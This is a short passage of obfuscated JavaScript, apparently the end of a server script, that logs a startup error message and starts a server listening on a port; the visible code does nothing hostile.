_0x2c8911=_0x471e6c;console[_0x2c8911(0xe6)]('Unhandled\x20error\x20in\x20startserver:',_0x4aab53);}),app[_0x471e6c(0x100)](PORT,()=>console['log'](_0x471e6c(0xa6)+PORT+'!'));
